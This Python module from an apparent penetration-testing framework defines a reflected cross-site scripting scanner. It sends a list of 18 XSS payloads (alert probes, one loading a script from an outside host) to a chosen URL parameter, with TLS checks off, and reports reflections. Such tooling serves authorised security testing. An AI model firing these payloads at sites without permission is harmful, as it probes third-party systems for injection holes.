"""Cross-Site Scripting (XSS) detector module"""

import requests
import urllib.parse
from colorama import Fore, Style
from modules.base import BaseModule

class XSSDetector(BaseModule):
    def __init__(self):
        super().__init__()
        self.description = "Cross-Site Scripting (XSS) vulnerability detector"
        self.module_type = "exploit"
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
        }
        self.required_options = ["URL", "PARAM"]
        
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<IMG SRC=\"javascript:alert('XSS');\">",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=`javascript:alert('XSS')`>",
            "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
            "\"><script>alert('XSS')</script>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
            "<svg><script>alert('XSS')</script></svg>",
        ]
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        
        print(f"{Fore.YELLOW}[*] Target URL: {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Testing parameter: {param}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Method: {method}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'='*60}{Style.RESET_ALL}\n")
        
        vulnerabilities = []
        
        for i, payload in enumerate(self.payloads, 1):
            print(f"{Fore.CYAN}[{i}/{len(self.payloads)}] Testing payload: {payload[:50]}...{Style.RESET_ALL}")
            
            if self._test_payload(url, param, payload, method, timeout):
                vulnerabilities.append({
                    "payload": payload,
                    "parameter": param
                })
                print(f"{Fore.RED}[!] VULNERABLE (Reflected XSS)!{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} potential XSS vulnerabilities!{Style.RESET_ALL}\n")
            for vuln in vulnerabilities:
                print(f"{Fore.YELLOW}  Param: {vuln['parameter']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}  Payload: {vuln['payload']}{Style.RESET_ALL}\n")
            
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            print(f"{Fore.GREEN}[+] No XSS vulnerabilities detected{Style.RESET_ALL}\n")
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def _test_payload(self, url, param, payload, method, timeout):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=timeout, verify=False)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False)
            
            if payload in response.text or urllib.parse.quote(payload) in response.text:
                return True
            
        except Exception:
            pass
        
        return False
